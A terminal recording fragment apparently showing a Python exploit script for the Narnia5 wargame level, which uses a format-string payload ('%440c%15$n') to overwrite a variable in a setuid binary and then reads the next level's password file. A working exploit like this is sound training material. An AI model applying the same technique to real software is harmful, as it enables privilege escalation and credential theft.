[12.179659, "o", "\u001b[1;1H\u001b[35mimport\u001b[m struct, subprocess\r\r\n\u001b[34m# narnia5: snprintf(buffer[64], 64, argv[1]) - argv[1] is the FORMAT. i sits at\u001b[m\u001b[2;80H\u001b[K\u001b[3;1H\u001b[34m# ebp-0x8, buffer at ebp-0x48: i = buffer+64, and with argv[1] as the format the\u001b[m\u001b[3;81H\u001b[K\u001b[4;1H\u001b[34m# varargs overlap the buffer itself: vararg k = buffer + 4*(k-1). 56 filler bytes +\r\r\n# 4-byte &i lands &i at vararg 15. %440c pads to 56+4+440=500 chars, %15$n stores\r\r\n# 500 into i. The program leaks &i with a probe of the same length, empty env.\u001b[m\r\r\n\u001b[33mdef\u001b[m \u001b[36mprobe_fmt\u001b[m():\r\r\n    p = subprocess.Popen([\u001b[31mb\"/narnia/narnia5\"\u001b[m, \u001b[31mb\"A\"\u001b[m * \u001b[31m64\u001b[m],\u001b[9;26Hstdout=subprocess.PIPE, stderr=subprocess.STDOUT, env={})\r\r\n    out, _ = p.communicate(timeout=\u001b[31m3\u001b[m)\r\r\n    \u001b[35mimport\u001b[m re\r\r\n    m = re.search(\u001b[31mrb\"i = 1 \\((0x[0-9a-f]+)\\)\"\u001b[m, out)\r\r\n    \u001b[33mreturn\u001b[m \u001b[36mint\u001b[m(m.group(\u001b[31m1\u001b[m), \u001b[31m16\u001b[m) \u001b[33mif\u001b[m m \u001b[33melse\u001b[m \u001b[36mNone\u001b[m\r\r\naddr = probe_fmt()\r\r\n\u001b[36mprint\u001b[m(\u001b[31m\"probe says &i =\"\u001b[m, \u001b[36mhex\u001b[m(addr) \u001b[33mif\u001b[m addr \u001b[33melse\u001b[m \u001b[36mNone\u001b[m)\r\r\n\u001b[33massert\u001b[m addr\r\r\nfmt = \u001b[31mb\"A\"\u001b[m * \u001b[31m56\u001b[m + struct.pack(\u001b[31m\"<I\"\u001b[m, addr) + \u001b[31mb\"%440c%15$n\"\u001b[m\r\r\np = subprocess.Popen([\u001b[31mb\"/narnia/narnia5\"\u001b[m, fmt],\u001b[19;22Hstdin=subprocess.PIPE, env={})\r\r\np.communicate(\u001b[31mb\"id\u001b[m\u001b[35m\\n\u001b[m\u001b[31mcat /etc/narnia_pass/narnia6\u001b[m\u001b[35m\\n\u001b[m\u001b[31mexit\u001b[m\u001b[35m\\n\u001b[m\u001b[31m\"\u001b[m, timeout=\u001b[31m10\u001b[m)\r\r\n\r\r\n\u001b[1m\u001b[34m~                                                 